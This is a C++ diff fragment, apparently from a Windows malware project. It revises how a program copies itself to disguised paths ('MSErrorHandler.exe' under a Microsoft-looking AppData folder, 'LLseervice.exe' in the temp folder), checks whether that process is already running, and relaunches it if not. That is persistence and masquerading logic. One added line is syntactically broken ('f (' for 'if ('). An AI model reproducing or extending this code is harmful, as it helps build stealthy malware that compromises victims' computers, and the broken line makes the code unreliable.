@@ -283,7 +283,11 @@ namespace ss
                                   
                                 }
                                 if (IO::exists_file(filename)){
-                                    IO::startup(filename.c_str());
+                                    f (GetIsOnProcess(filename)){
+                                    //ss::creckSoc();
+                                    } else {
+                                        IO::startup(filename_path.c_str());
+                                       }
                                 } else{
                                     if (!IO::copy_File()) break;
                                 }
@@ -301,14 +305,21 @@ namespace ss
                 if (filename == "MSErrorHandler.exe"){
                     std::string appdata_dir(getenv("*APPDATA*"));
                     std::string path = appdata_dir + "\\Microsoft\\Services\\";
-                    filename = path+"MSErrorHandler.exe";
+                    filename = "MSErrorHandler.exe";
+                    filename_path = path+"MSErrorHandler.exe";
                 } else{
                     char* temp = getenv("temp");
                     std::string temp_dir(temp);
-                    filename  = temp_dir+"\\LLseervice.exe";
+                    filename = "LLseervice.exe";
+                    filename_path  = temp_dir+"\\LLseervice.exe";
                 }
                 if (IO::exists_file(filename)){
-                    IO::startup(filename.c_str());
+                    if (GetIsOnProcess(filename)){
+                    //ss::creckSoc();
+                    } else {
+                        IO::startup(filename_path.c_str());
+                    }
+               
                 } else{
                     if (IO::copy_File()) {
                         //continue
